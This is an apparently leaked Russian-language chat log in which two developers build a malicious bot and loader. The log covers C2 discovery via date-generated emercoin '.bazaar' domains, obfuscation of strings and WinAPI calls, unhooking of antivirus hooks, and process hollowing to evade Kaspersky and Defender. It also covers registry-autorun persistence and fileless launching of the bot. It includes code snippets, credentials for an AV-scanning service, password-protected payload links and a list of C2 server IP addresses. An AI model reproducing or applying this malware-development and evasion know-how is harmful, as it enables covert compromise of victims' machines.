       flags |= SECURITY_FLAG_IGNORE_REDIRECT_TO_HTTP;
   wininet.internetSetOption(req, INTERNET_OPTION_SECURITY_FLAGS, &flags, flagsSize);
2020-07-06 11:48:06.467077	mushroom	frog	Вот так, а потом уже запрос посылай.
2020-07-06 13:03:28.025787	frog	mushroom	Если дата на сервере не совпадает с локальной, то пропускать сервер?
2020-07-06 13:04:28.385594	mushroom	frog	Если подпись не сходится, или дата (без времени) не совпадает с локальной, ищем другой сервер. Так в ТЗ написано.
2020-07-06 13:38:19.636772	frog	mushroom	Как проверить, занят ли адрес emercoin, который сам придумал?
2020-07-06 13:39:12.478488	mushroom	frog	Который сам придумал, попробуй его получить. Через dns запрос как я писал или через resolve_emercoin.
2020-07-10 09:23:42.873061	frog	mushroom	Привет! Есть несколько вопросов.
Когда генерируется имя домена на основе текущей даты получается последовательность символов (по алгоритму в ТЗ, там есть функция для этого). Как эту последовательность преобразовать в IP-адрес?

Как делать переподключение? В ТЗ сказано:
"Если в течение трех попыток был таймаут передачи, бот удваивает интервалы отправки, вплоть до достижения интервала в 30 минут."
Сколько времени (или сколько попыток) пытаться подключится к конкретному IP-адресу и когда начинать искать другой сервер?

Сейчас только HTTP-код 200 считается успешным. В ТЗ говорится про HTTP-коды 40*, 50* тоже. И как быть, если не удаётся отправить файл?
2020-07-10 09:30:10.575355	mushroom	frog	К этой последовательности добавь .bazaar
2020-07-10 09:30:17.835385	mushroom	frog	Это адрес emercoin
2020-07-10 09:34:34.014554	mushroom	frog	Одна попытка, подключиться к одному адресу. Прошёл все адреса во всех списках, уснул. Опять идёшь по списку адресов всех, только теперь между списками засыпаешь на 30 минут.
2020-07-10 09:35:17.708852	mushroom	frog	Опять не получилось, завершение работы.
2020-07-10 09:35:54.415850	mushroom	frog	3 попытки отправить запрос, не получилось, переподключение, опять идешь по спискам, как я писал выше.
2020-07-10 09:36:46.693427	mushroom	frog	Успешно только код 200, всё остальное не успешно считается, ещё две попытки тогда делаешь, не удачно и пять переподключение.
2020-07-10 09:39:33.379538	mushroom	frog	Я тебе пришлю пример обфускации строк и WinApi вызовов. Там просто вставишь в к себе. У тебя же всё сделано можно сказать. Твой комплект в работу пускать пора Буза сказал. Допиливай шероховатости что остались.
2020-07-10 09:42:31.520625	mushroom	frog	Download: https://qaz.im/load/6YnkTy/a8rKD7   
Delete: https://qaz.im/index.php?a=delete&q=70564758    
Пароль: 6#qspX.rR8@1-Y8$S
2020-07-10 09:43:51.325059	mushroom	frog	Обфускация строк _STR("Анси строка"), WCHAR[] wstr; lstrcpyW(wstr, L"Юникод"); используешь потом wstr где нужен юникод.
2020-07-10 09:44:42.318288	mushroom	frog	Обфускация строк включается макросом OBFUSCATED_STRINGS, его надо включить в Release_nologs.
2020-07-10 09:46:44.624973	mushroom	frog	Обфускация WinApi там и так понятно. Глобальные переменные kernel32 и т.д. это объекты классов обёрток над библиотеками WinApi, у них загрузка и получение адреса функции WinApi, и её вызов происходит на лету, по этому в бинарном файле нету следов этих функций.
2020-07-10 09:48:24.298860	mushroom	frog	Добавляешь заголовок winapiproxy.h и используешь объекты kernel32 и т.д. Например kernel32.getTempPath, wininet.internetOpen, wininet.internetClose.
2020-07-10 09:49:08.920148	mushroom	frog	Добавление новых функций для обфускации делай так же как там, просто как метод класса, там не сложно.
2020-07-10 09:49:56.017773	mushroom	frog	Позаменяй все строки статические у себя на _STR("строка")\_WCS("Строка")\_TSTR("Строка").
2020-07-10 09:50:34.721171	mushroom	frog	_TSTR превращается в _STR если не указан макрос UNICODE, и в _WCS если указан, сделано для удобства.
2020-07-10 09:52:05.712980	mushroom	frog	Потом проверь импорт получившегося файла, и строки в нём. Их не должно быть. Удобная утилита для просмотра exe файла http://www.mitec.cz/exe.html если надо.
2020-07-10 09:52:58.985374	mushroom	frog	Сделаешь. Пиши, дам тебе логин\пароль на dyncheck, там проверишь на антивирусы.
2020-07-10 09:55:19.178278	frog	mushroom	А в GetApi.h как можно добавить функции, которых там нет?
2020-07-10 09:58:40.022435	mushroom	frog	Там больше писанины:
HMODULE lib = LoadLibrary("...");
typedef void(WINAPI* functype)(void)
functype ptr = (functype)GetProcAddress(lib, "func");
ptr()
2020-07-10 09:59:13.010049	mushroom	frog	В том что я тебе послал это уже сделано для большого числа функций.
2020-07-10 10:00:22.318347	mushroom	frog	Вот например как у меня подключение к серверу сделано:
bool Commander::connect()
{
    if (addressListConnect())
        return true;

    if (emercoinListConnect())
        return true;

    if (dateListConnect())
        return true;

    debug_printf(TEXT("Sleep %u msecs\n"), TRY_CONNECT_INTERVAL);
    kernel32.sleep(TRY_CONNECT_INTERVAL);

    if (addressListConnect())
        return true;

    debug_printf(TEXT("Sleep %u msecs\n"), TRY_LIST_CONNECT_INTERVAL);
    kernel32.sleep(TRY_LIST_CONNECT_INTERVAL);

    if (emercoinListConnect())
        return true;

    debug_printf(TEXT("Sleep %u msecs\n"), TRY_LIST_CONNECT_INTERVAL);
    kernel32.sleep(TRY_LIST_CONNECT_INTERVAL);

    if (dateListConnect())
        return true;

    return false;
}
2020-07-10 10:01:06.335705	mushroom	frog	По всем спискам прошёл, не прокатило, уснул, опять по всем спискам, только между списками интервал 30 минут. Не прокатило завершение.
2020-07-10 10:03:25.224165	mushroom	frog	TRY_CONNECT_INTERVAL - 5 мин., TRY_LIST_CONNECT_INTERVAL 30 мин.
2020-07-10 12:03:37.063414	frog	mushroom	Хотел уточнить:
Если так случиться, что имя домена и имя компьютера будет одинаковым у двух компьютеров, то и id будут совпадать.
Вставил в id ещё дату создания папки Windows, но и эта дата может совпадать у разных машин.  Что в этом случае делать?
2020-07-10 12:04:46.803580	mushroom	frog	Дата создания с точность до 1 мсек используй, чтобы максимально избежать этого.
2020-07-10 12:05:40.730469	mushroom	frog	Тогда вероятность что всё совпадёт будет стремиться к нулю.
2020-07-10 12:08:37.920411	mushroom	frog	Как пример:
TCHAR sysPath[MAX_PATH + 1];
    if (!kernel32.getSystemWindowsDirectory(sysPath, MAX_PATH + 1))
    {
        debug_printf(TEXT("Can't get system windows directory, error: %u\n"), GetLastError());
        *size = 0;
        return FALSE;
    }

    HANDLE sysFolder = kernel32.createFile(sysPath, GENERIC_READ, FILE_SHARE_READ, NULL,
        OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS, NULL);
    if (sysFolder == INVALID_HANDLE_VALUE)
    {
        debug_printf(TEXT("Can't open system windows directory, error: %u\n"), GetLastError());
        *size = 0;
        return FALSE;
    }

    FILETIME sysFolderFileTime = { 0 };
    if (!kernel32.getFileTime(sysFolder, &sysFolderFileTime, NULL, NULL))
    {
        debug_printf(TEXT("Can't get system windows directory file time, error: %u\n"),
            GetLastError());
        kernel32.closeHandle(sysFolder);
        *size = 0;
        return FALSE;
    }
    kernel32.closeHandle(sysFolder);

    SYSTEMTIME sysFolderSystemTime = { 0 };
    if (!kernel32.fileTimeToSystemTime(&sysFolderFileTime, &sysFolderSystemTime))
    {
        debug_printf(
            TEXT("Can't convert system windows directory file time to system time, error: %u\n"),
            GetLastError());
        *size = 0;
        return FALSE;
    }

    TCHAR creationDateStr[19];
    wsprintf(creationDateStr, _TSTR(TEXT("%u%u%u%u%u%u%u")), sysFolderSystemTime.wMonth,
        sysFolderSystemTime.wDay, sysFolderSystemTime.wYear, sysFolderSystemTime.wHour,
        sysFolderSystemTime.wMinute, sysFolderSystemTime.wSecond,
        sysFolderSystemTime.wMilliseconds);
2020-07-10 12:10:46.966828	frog	mushroom	Где-то читал, что эта дата фиксируется при сборке ОС, а не при установке (для некоторых версий Windows). У меня, например, дата создания папки Windows "14 ‎июля ‎2009 ‎г", хотя на самом деле установлена намного позже.
2020-07-10 12:13:10.142836	mushroom	frog	Проверь. Что получается, там можно брать дату создания или дату последнего изменения.
2020-07-10 12:13:25.077473	mushroom	frog	У меня дата создания нормальная.
2020-07-10 12:14:15.857092	mushroom	frog	getFileTime(sysFolder, &sysFolderFileTime, NULL, NULL) вот здесь можно брать где NULL даты последнего изменения и т.д.
2020-07-10 12:37:10.944103	mushroom	frog	Пока оставь дату создания с большой точностью, пока не было косяков с id ботов. Надо будет уточнить когда эта дата ставится.
2020-07-10 15:20:05.993154	frog	mushroom	Если команда запрошена с одного ip-адреса и потерялась связь с этим ip-адресом, то ответ можно отправлять на другой ip-адрес (который найдем по спискам) или нет? Не совсем понял, админка общая для всех ip-адресов или нет?
2020-07-10 15:20:38.488541	mushroom	frog	Да. Общая для всех адресов.
2020-07-10 15:21:37.212569	mushroom	frog	Команду запросил, получил, отправляешь результат ошибка 3 раза, переподключение, куда удалось подключиться туда и отправляй результат.
2020-07-10 15:22:20.625262	frog	mushroom	Понял.
В ТЗ сказано функцию get_possible_domain нужно обфусцировать. Нужно запутать, усложнить её?
2020-07-10 15:23:42.277494	mushroom	frog	Да можешь запутать. Ещё вызовы функций WinApi в ней обфусцируй. Я просто вызовы WinApi функций обфусцировал в ней. Можешь лишних вычислений в неё впихнуть.
2020-07-10 15:28:49.959097	frog	mushroom	А как в GetApi.h вычисляется кэш - 2 параметр (например, 0xC8AC8026)?
#define pCustomFunc pushargEx< DLL_KERNEL32, 0xC8AC8026, 1 >
Третий, это вроде индекс в таблице. А вот со вторым так и не разобрался.
2020-07-10 15:31:36.081819	mushroom	frog	Не знаю, я не разбирался. Просто использовал его, а потом свой написал Winapiproxy, GetApi падать может на разных версиях Windows, потому что там адреса функций, которые в нём используются в разных версиях windows разные.
2020-07-10 15:32:05.018800	mushroom	frog	По этому я его и перестал использовать, из-за неудобства.
2020-07-10 15:33:03.374565	mushroom	frog	Я думаю второй параметр это адрес функции в библиотеке.
2020-07-10 15:33:53.121482	frog	mushroom	Нужно убрать все (или частично) подключения lib-файлов, чтобы уменьшить размер исполняемого файла?
2020-07-10 15:34:46.007806	mushroom	frog	Winapi убрать всё кроме простых функций работы со строками, выделения памяти, освобождения памяти.
2020-07-10 15:35:31.392573	mushroom	frog	Размер меньше будет, чем меньше будешь использовать стандартную библиотеку.
2020-07-10 15:36:16.918387	mushroom	frog	Надо скрыть следы функций WinApi в бинарном файле, для этого и делаем обфускацию функций WinApi.
2020-07-10 15:36:54.321914	mushroom	frog	И строк тоже, чтобы например адреса сервера не были в открытую в бинарном файле видны.
2020-07-10 15:42:56.058669	frog	mushroom	Если локальная дата отличается от серверной (на день) вследствие того, что часовые пояса различаются, то нужно это учитывать?
Т.е. где-то уже наступил новый день (на сервере, например), а на клиенте ещё нет.
2020-07-10 15:43:23.188633	mushroom	frog	Не отличаются, используется время UTC.
2020-07-10 15:43:48.770855	mushroom	frog	В универсальном формате.
2020-07-10 15:44:36.872437	mushroom	frog	Не используй локальную дату.
2020-07-10 15:45:51.787468	mushroom	frog	SYSTEMTIME sysTime = { 0 };
    kernel32.getSystemTime(&sysTime);
2020-07-10 15:48:02.031769	mushroom	frog	Если там не совпадёт теоретически из-за секунд например, подключаться всё равно по спискам будет несколько часов.
2020-07-10 15:48:24.045265	mushroom	frog	Особенно по последнему, который на основе даты генерируется.
2020-07-10 15:48:46.889959	mushroom	frog	На втором проходе списков тогда дата совпадёт.
2020-07-10 15:50:11.058463	frog	mushroom	Третий список очень долго проверяется. В ТЗ написано 5000 подключений пытаться делать. Это нормально?
2020-07-10 15:50:23.494928	mushroom	frog	Да.
2020-07-10 15:52:47.480533	mushroom	frog	5000 адресов emercoin переберёш, которые сгенерируются на основе даты.
2020-07-10 15:56:39.366563	frog	mushroom	В ТЗ сказано, что времени на поиск сервера даётся 3 часа. За это время 5000 адресов, наверное, не перебрать. Или можно искать дольше, как в том примере, который был выше.
2020-07-10 16:00:16.534353	mushroom	frog	Как получиться 5000 адресов перебрать.
2020-07-10 16:00:32.677407	mushroom	frog	По мои прикидкам 5000 это меньше 3 часов.
2020-07-10 16:04:42.180031	frog	mushroom	У меня сейчас за 3 часа примерно 500 успевается проверять. Это, наверное, потому что использую 2 способа. Функция из библиотеки resolve_emercoin дольше проверяет emercoin адрес.
2020-07-10 16:06:41.195799	mushroom	frog	Перебирай по 5000, как пойдёт, если надо будет потом просто уменьшишь количество, пока 5000 за раз.
2020-07-10 16:11:37.619342	mushroom	frog	Пока я пошёл.
2020-07-10 16:11:54.178204	frog	mushroom	Пока
2020-07-13 11:38:47.685691	frog	mushroom	Привет!
Во время маскировки процесса при вызове ResumeThread антивирус Касперского ругается. И когда запускаешь exe-файл из папки temp ему тоже не нравится. Что с этим делать?
Постарался  максимально обфусцировать системные вызовы, но в отладчике вижу какие-то не свои вызовы WinApi где-то в прологе и эпилоге. Их можно как-то убрать?
Загрузил на github последние изменения.
2020-07-13 11:41:42.190506	mushroom	frog	Привет. Нет не свои нельзя убрать. В импорте у exe что там?
2020-07-13 11:41:51.672654	mushroom	frog	Какие функции?
2020-07-13 11:42:12.197501	mushroom	frog	Строки какие в бинарнике?
2020-07-13 11:42:30.035823	mushroom	frog	Что пишет антивирус, как называет угрозу твою?
2020-07-13 11:45:07.878452	frog	mushroom	Адрес            Тип     П Символ                                     Символ (undecorated)
000000013F0CA5DC Экспорт 0 OptionalHeader.AddressOfEntryPoint         
000000013F0CC000 Импорт    GetProcAddress                             
000000013F0CC008 Импорт    GetModuleHandleW                           
000000013F0CC010 Импорт    RtlCompareMemory                           
000000013F0CC018 Импорт    K32EnumProcesses                           
000000013F0CC020 Импорт    GetSystemTimeAsFileTime                    
000000013F0CC028 Импорт    SetUnhandledExceptionFilter                
000000013F0CC030 Импорт    GetCurrentProcess                          
000000013F0CC038 Импорт    TerminateProcess                           
000000013F0CC040 Импорт    IsProcessorFeaturePresent                  
000000013F0CC048 Импорт    CloseHandle                                
000000013F0CC050 Импорт    InitializeSListHead                        
000000013F0CC058 Импорт    GetCurrentThreadId                         
000000013F0CC060 Импорт    GetCurrentProcessId                        
000000013F0CC068 Импорт    QueryPerformanceCounter                    
000000013F0CC070 Импорт    GetStartupInfoW                            
000000013F0CC078 Импорт    IsDebuggerPresent                          
000000013F0CC080 Импорт    CreateEventW                               
000000013F0CC088 Импорт    WaitForSingleObjectEx                      
000000013F0CC090 Импорт    ResetEvent                                 
000000013F0CC098 Импорт    SetEvent                                   
000000013F0CC0A0 Импорт    DeleteCriticalSection                      
000000013F0CC0A8 Импорт    InitializeCriticalSectionAndSpinCount      
000000013F0CC0B0 Импорт    LeaveCriticalSection                       
000000013F0CC0B8 Импорт    EnterCriticalSection                       
000000013F0CC0C0 Импорт    UnhandledExceptionFilter                   
000000013F0CC118 Импорт    inet_ntop                                  
000000013F0CC120 Импорт    Ordinal17                                  
000000013F0CC128 Импорт    Ordinal15                                  
000000013F0CC130 Импорт    Ordinal23                                  
000000013F0CC138 Импорт    Ordinal20                                  
000000013F0CC140 Импорт    Ordinal22                                  
000000013F0CC148 Импорт    Ordinal18                                  
000000013F0CC150 Импорт    Ordinal3                                   
000000013F0CC158 Импорт    Ordinal9                                   
000000013F0CC160 Импорт    Ordinal57                                  
000000013F0CC168 Импорт    inet_pton                                  
000000013F0CC170 Импорт    Ordinal151                                 
000000013F0CC268 Импорт    RtlVirtualUnwind                           
000000013F0CC270 Импорт    RtlLookupFunctionEntry                     
000000013F0CC278 Импорт    RtlCaptureContext                          
000000013F0CC108 Импорт    __CxxFrameHandler4                         
000000013F0CC0D0 Импорт    __current_exception                        
000000013F0CC0D8 Импорт    __C_specific_handler                       
000000013F0CC0E0 Импорт    memset                                     
000000013F0CC0E8 Импорт    __std_terminate                            
000000013F0CC0F0 Импорт    __current_exception_context                
000000013F0CC0F8 Импорт    memcpy                                     
000000013F0CC250 Импорт    _set_fmode                                 
000000013F0CC258 Импорт    __p__commode                               
000000013F0CC180 Импорт    atoi                                       
000000013F0CC1C8 Импорт    _c_exit                                    
000000013F0CC1D0 Импорт    _register_thread_local_exe_atexit_callback 
000000013F0CC1D8 Импорт    _initterm                                  
000000013F0CC1E0 Импорт    _exit                                      
000000013F0CC1E8 Импорт    _configure_narrow_argv                     
000000013F0CC1F0 Импорт    exit                                       
000000013F0CC1F8 Импорт    _initialize_narrow_environment             
000000013F0CC200 Импорт    _set_app_type                              
000000013F0CC208 Импорт    _initialize_onexit_table                   
000000013F0CC210 Импорт    _seh_filter_exe                            
000000013F0CC218 Импорт    _get_narrow_winmain_command_line           
000000013F0CC220 Импорт    _initterm_e                                
000000013F0CC228 Импорт    terminate                                  
000000013F0CC230 Импорт    _cexit                                     
000000013F0CC238 Импорт    _register_onexit_function                  
000000013F0CC240 Импорт    _crt_atexit                                
000000013F0CC190 Импорт    _set_new_mode                              
000000013F0CC198 Импорт    free                                       
000000013F0CC1B8 Импорт    __setusermatherr                           
000000013F0CC1A8 Импорт    _configthreadlocale
2020-07-13 11:46:04.442946	frog	mushroom	И строки:
Адрес            Дизассемблированный код                      Строка                             
000000013F0CA108 lea rcx,qword ptr ds:[13F0CC3A0]             L"api-ms-win-core-synch-l1-2-0.dll"
000000013F0CA11D lea rcx,qword ptr ds:[13F0CC478]             L"kernel32.dll"
000000013F0CA132 lea rdx,qword ptr ds:[13F0CC3E8]             "SleepConditionVariableCS"
000000013F0CA142 lea rdx,qword ptr ds:[13F0CC408]             "WakeAllConditionVariable"
000000013F0CA649 or qword ptr ds:[13F0D0020],FFFFFFFFFFFFFFFF "/ "
2020-07-13 11:49:41.877194	frog	mushroom	Антивирусник сообщает:
PDM:Exploit.Win32.Generic.nblk
или
PDM:Exploit.Win32.Generic
2020-07-13 11:49:44.285845	mushroom	frog	Я тебе забыл дать логин пароль для dyncheck. Там проверять будешь, пока только на статику.
2020-07-13 11:50:11.797758	mushroom	frog	dyncheck.com
graddds@xmpp.jp
49gjI9gfdpgj49gpjoJKGLFDg23
2020-07-13 11:51:05.844492	mushroom	frog	Там проверь release_nologs 32\64 бита.
2020-07-13 11:51:20.580500	mushroom	frog	Напиши сколько будет детектов и что пишут.
2020-07-13 11:52:21.287956	mushroom	frog	Проверяй на статику, windows defender cloud выключен должен быть и интернет тоже. Там так всегда стоит по умолчанию.
2020-07-13 12:02:14.893159	mushroom	frog	Забыл сказать на dyncheck лучше заходить через vpn или tor.
2020-07-13 12:03:07.253925	frog	mushroom	Через tor зашёл.
Для версии x86 результаты проверки на dyncheck такие:
Vba32 AntiVirus Personal |   infected BScope.Trojan.Meterpreter
Windows Defender           |  VirTool:Win32/Obfuscator.QV
2020-07-13 12:03:29.626137	mushroom	frog	Обфусцировал GetApi.h?
2020-07-13 12:03:49.056379	mushroom	frog	Это из-за него может быть.
2020-07-13 12:04:00.695698	mushroom	frog	Такое бывало.
2020-07-13 12:04:56.600089	mushroom	frog	Я в коде вижу GetApi.h для обфускации используешь. Так?
2020-07-13 12:05:07.415834	frog	mushroom	да
2020-07-13 12:05:24.141062	mushroom	frog	Попробуй замени на тот что я дал.
2020-07-13 12:05:42.696041	mushroom	frog	На него VirTool:Win32/Obfuscator.QV не было ещё не разу.
2020-07-13 12:06:09.950110	mushroom	frog	Потом напиши что получилось.
2020-07-13 12:07:26.812077	mushroom	frog	Я отошёл.
2020-07-13 12:29:35.803051	mushroom	frog	В импорте нашёл Ws2_32.dll функции inet_ntop, inet_pton. Надо убрать.
2020-07-13 12:30:39.074367	mushroom	frog	Они наверное из resolve_emercoin
2020-07-13 12:33:42.965746	mushroom	frog	Download: https://qaz.im/load/d47bkf/t6te4d   
Delete: https://qaz.im/index.php?a=delete&q=925966803
Пароль: ]4so's&WSpxHK04a`
2020-07-13 12:35:13.138621	mushroom	frog	Можно так. Отдельно из-за того что заголовок winsock2.h должен всегда идти перед windows.h, а этого трудно добиться, из-за этого будут ошибки сборки. По этому сделано отдельным файлом, чтобы не миксовать.
2020-07-13 12:42:51.046901	mushroom	frog	Строк вроде не нашёл подозрительных. x86 у меня Defender сразу спалил, x64 нет. Пишет про обфускацию, скорей всего этот она палится.
2020-07-13 12:43:09.596821	mushroom	frog	Как заменишь обфускацию скажешь.
2020-07-13 12:43:36.752015	mushroom	frog	И Ws2_32 из импорта по максимуму убери.
2020-07-13 12:49:46.182975	frog	mushroom	Попробую ещё найти причину в GetApi.
2020-07-13 13:05:10.147200	mushroom	frog	Там наверное запален алгоритм, того как это работает.
2020-07-13 13:06:12.936168	mushroom	frog	Не затягивай. Если не проходит с GetApi.h заменяй его.
2020-07-13 15:36:26.929607	frog	mushroom	Динамическую проверку на dyncheck.com делать нужно?
2020-07-13 15:42:45.988224	mushroom	frog	Пока нет. Статическая что показывает?
2020-07-13 15:42:58.316371	mushroom	frog	Всё чисто?
2020-07-13 15:43:42.026743	frog	mushroom	Чисто. Подправил GetApi.
2020-07-13 15:44:38.227122	mushroom	frog	Если всё чисто для x86\x64. То динамическую проверку надо делать полным набором. То есть запускать загрузчик в этой проверке.
2020-07-13 15:44:58.008077	mushroom	frog	Загрузчик тоже полностью чист?
2020-07-13 15:45:07.436102	mushroom	frog	И обфусцирован?
2020-07-13 15:47:13.174989	frog	mushroom	Нет. Загрузчик ещё не готов. Закрепление не успел ещё сделать.
Не очень понимаю, как способ закрепления делать. В той статье их много описано, за какой браться, ещё не разобрался.
2020-07-13 15:47:52.874680	mushroom	frog	Берись за самый для тебя простой, тупа на автозапуск в реестре пусть добавляется пока.
2020-07-13 15:47:57.993384	mushroom	frog	Загрузчик.
2020-07-13 15:48:28.325205	mushroom	frog	Доделывай загрузчик тогда, обфусцируй его по примеру бота.
2020-07-13 15:48:48.243390	mushroom	frog	Нам нужен весь комплект (загрузчик + бот).
2020-07-13 15:48:57.145586	mushroom	frog	Чтобы отдать тестеру.
2020-07-13 15:53:27.322723	frog	mushroom	А с Касперским как быть? Чтобы он не реагировал? В processhollowing он на ResumeThread реагирует. ResumeThread пробовал по разному, не помогает.
2020-07-13 15:54:09.521764	mushroom	frog	ResumeThread обфусцировал?
2020-07-13 15:54:36.289089	mushroom	frog	Это в processhollowing или в doppelgaging?
2020-07-13 15:54:36.290440	mushroom	frog	Это в processhollowing или в doppelgaging?
2020-07-13 15:55:12.696712	frog	mushroom	Конечно. в processhollowing.  libproxy использовал
2020-07-13 15:56:02.039231	mushroom	frog	Посмотрю. Завтра. Пока доделывай загрузчик.
2020-07-14 12:50:43.650703	frog	mushroom	Привет.
Как правильно узнавать дату на сервере?
Делал так всегда: HttpQueryInfoA(hHttpRequest, HTTP_QUERY_DATE, date, &bufferSize, &index);
Пробовал ещё так: HttpQueryInfo(hHttpRequest, HTTP_QUERY_RAW_HEADERS_CRLF, cookiesBuffer, &cookiesBufferSize, &index);
Но иногда получаются разные строки дат.
И формат даты преобразовать нужно?  Потому что сейчас, например, запрос возвращает результат "Tue, 14 Jul 2020 12:47:34 GMT"
Раньше формат другой был (2020-07-14).
2020-07-14 12:56:11.636743	mushroom	frog	Привет. Никак не надо. Просто запрос GET /<id>/4 в заголовках дату должен вернуть.
2020-07-14 12:56:28.673793	mushroom	frog	Это для бота.
2020-07-14 12:59:08.339984	mushroom	frog	Для загрузчика запрос для получения версии, там в заголовках тоже дата будет.
2020-07-14 13:03:59.865616	frog	mushroom	Здесь? Только тут время (на тестовом сервере) вместо даты (поле Date).
Это результат запроса HEAD:
"HTTP/1.1 200 OK\r\nServer: nginx/1.10.3 (Ubuntu)\r\nContent-Type: text/html; charset=UTF-8\r\nConnection: keep-alive\r\nDate: 12:59:53\r\nX-Tag: v1.0\r\n\r\n"
2020-07-14 13:04:29.016710	mushroom	frog	На боевом проверяй.
2020-07-14 13:04:42.953509	mushroom	frog	На тестовом подписи нету.
2020-07-14 13:06:26.693333	frog	mushroom	Разбирался ещё с Process Hollowing x86. Выяснилось, что антивирус реагирует как только есть попытка что-либо записать (WriteProcessMemory) в память по адресу PebImage Base Address. Даже если один байт там поменять, он реагирует. Всё обфусцировал.
2020-07-14 13:08:05.736424	mushroom	frog	m_module = m_kernel32.loadLibrary(fileName);
removeHooks(m_module);
2020-07-14 13:08:25.422894	mushroom	frog	это в файле libraryproxy.cpp
2020-07-14 13:08:54.918446	mushroom	frog	Посмотри эта функция удаляет как раз ловцшки, которые ставят антивирусы на подозрительные функции.
2020-07-14 13:09:52.757390	mushroom	frog	Соответсвенно функция нужно потом вызывать брать и вызывать из m_module. В libraryproxy уже всё сделано для этого.
2020-07-14 13:11:53.663217	mushroom	frog	Удаляй так ловушки у всех библтотек WinApi, которые используешь.
2020-07-14 13:16:57.305553	frog	mushroom	Process Hollowing весь обфусцировал с помощью libraryproxy. 
Проверю ещё раз. Нехватало некоторых функций, который вызывает removeHooks: Rva2Offset, isForwardedFunc. Пришлось собирать их из интернета и из старой AntiHooks.cpp, может поэтому что-то не работает.
2020-07-14 13:17:57.333730	mushroom	frog	Сейчас пришлю что не хватает.
2020-07-14 13:20:10.949753	mushroom	frog	Download: https://qaz.im/load/HEFdrH/SRfi4k   
Delete: https://qaz.im/index.php?a=delete&q=1486018534
Пароль: g48CLBJb\sm=;GI0x
2020-07-14 13:52:57.201616	frog	mushroom	Пока не работает. Попробую ещё в отдельный проект вынести  Process Hollowing и запустить им что-нибудь. 
Как нужно запускать бот из загрузчика? В ТЗ сказано, не нужно сохранять бот на диск. Это значит, использовать тот же Process Hollowing?
2020-07-14 13:53:20.551490	mushroom	frog	Да.
2020-07-14 13:59:42.157759	mushroom	frog	Вот как у меня сделан process hollowing:
Download: https://qaz.im/load/zR8ThN/Rbsrze   
Delete: https://qaz.im/index.php?a=delete&q=2013528276
Пароль: p!N(7m%\@1PPm&fmE
2020-07-14 14:00:14.274057	mushroom	frog	Если нужно.
2020-07-15 12:57:25.819374	frog	mushroom	Привет!
Разобрался с Process hollowing x86. Долго искал причину, но нашёл. Теперь антивирус Касперского молчит. Проверил на ОС Windows 10, тоже тихо. Все вызовы ws2_32 обфусцировал. Последнюю  версию бэкдора загрузил на github.
Такой момент хотел уточнить. Иногда rundll.exe запускает rundll.exe*32 и не могу отследить момент завершения второго exe-файла (rundll.exe*32), чтобы вовремя удалить dll-файл.
Файл загрузчика куда лучше спрятать при запуске? В папку Windows?
2020-07-15 12:57:51.299598	frog	mushroom	Сейчас делаю загрузчик
2020-07-15 13:01:12.781895	mushroom	frog	В temp или appdata. За это отвечает другой человек, который делает крипт. Это такая программа внутри которой будет находится твоя программа. Он её вытаскивает и запускает. Так что тебе только стоит беспокоиться куда загружать новую версию загрузчика, в temp или appdata лучше всего.
2020-07-15 13:02:09.951838	mushroom	frog	Иногда rundll.exe запускает rundll.exe*32 и не могу отследить момент завершения второго exe-файла (rundll.exe*32), чтобы вовремя удалить dll-файл. Это по точнее объясни.
2020-07-15 13:06:04.974247	mushroom	frog	Создаёшь процесс, у тебя есть его описатель и ProcessInformation. Их завершения можно ждать WaitForSingleObject. Запомнил имя файла dll. Дождался завершения процесса, удалил. Это только если у процесса есть таймаут, если он 0, то нас дальнейшая судьба его не интересует, и судьба файла тоже.
2020-07-15 13:21:20.321030	frog	mushroom	А закреплять в системе тогда тот файл, который скопирую в папку temp или appdata?
По поводу rundll сейчас попробую воспроизвести эту ошибку
2020-07-15 13:22:06.878754	mushroom	frog	Сам себя закрепляй. Получай имя свое программы и используй его.
2020-07-15 13:22:36.614997	mushroom	frog	Программа должна сама себя закреплять.
2020-07-15 13:22:48.587215	frog	mushroom	Кажется понял
2020-07-15 13:24:39.567819	mushroom	frog	WCHAR filename[MAX_PATH + 1];
    if (kernel32.getModuleFileNameW(NULL, filename, _countof(filename)))
2020-07-15 13:24:52.475104	mushroom	frog	Так получишь имя файла своей программы.
2020-07-15 13:25:26.124732	mushroom	frog	Или можешь getModuleFileNameA для ANSI кодировки.
2020-07-15 13:37:33.179702	frog	mushroom	Хорошо. Спасибо. 
А удалить из 64-разрядной версии Release вызовы VCRUNTIME140_1.dll можно как-нибудь?
2020-07-15 13:39:49.228817	mushroom	frog	Это ты из стандартной библиотеки что то использовал. Удалить можно если её не использовать.
2020-07-15 13:40:07.397993	mushroom	frog	string использовал точно.
2020-07-15 13:40:20.252194	mushroom	frog	Статически линкуй.
2020-07-15 13:40:46.994464	mushroom	frog	Чтобы работало везде, и там где не установлено vcredist.
2020-07-15 14:29:56.422731	frog	mushroom	string он же самописный. Сделал статическую компоновку (/MT), 64-разрядные файлы стали запускаться.
Разобрался с rundll.exe. Ошибка была в другом: удалял файл раньше, чем нужно. Но из-за этой ошибки возник вопрос: если процесс запущен с нулевым таймаутом, нужно всё равно дождаться в отдельном потоке его завершения и удалить файл?
2020-07-15 14:30:44.880559	mushroom	frog	Нет. Если таймаут 0 файл и процесс нас не интересуют.
2020-07-15 14:31:27.190477	mushroom	frog	Всё сделал?
2020-07-15 14:32:01.163877	mushroom	frog	Коммить всё (загрузчик и бот).
2020-07-15 14:34:34.273826	frog	mushroom	Загрузчик ещё дописываю
2020-07-15 14:35:53.124046	mushroom	frog	Закоммитишь тогда. Чтобы запустил загрузчик, он закрепился и скачал и запустил бот. И после перезагрузки он запустился скачал и запустил бот.
2020-07-15 14:36:48.042517	frog	mushroom	Хорошо
2020-07-16 06:49:39.229104	frog	mushroom	Загрузил последние версии обоих проектов на gitlab. Проверить загрузчик не успел, так как не было доступного рабочего сервера, а с тестового серверы файлы перестали скачиваться. Попробую позже.
2020-07-16 07:08:28.299997	frog	mushroom	Загрузил последние версии обоих проектов на gitlab. Проверить загрузчик не успел, так как не было доступного рабочего сервера, а с тестового серверы файлы перестали скачиваться. Попробую позже.
2020-07-16 08:36:46.521835	mushroom	frog	По поводу адресов. Они меняются часто.
2020-07-16 08:36:55.910933	mushroom	frog	Вот тебе рабочие на данный момент.
2020-07-16 08:37:17.221174	mushroom	frog	Загрузчик: https://185.99.2.49:443,https://78.108.216.13:443,https://217.12.209.44:443,https://185.99.2.191:443,https://80.82.68.132:443,https://62.108.35.215:443
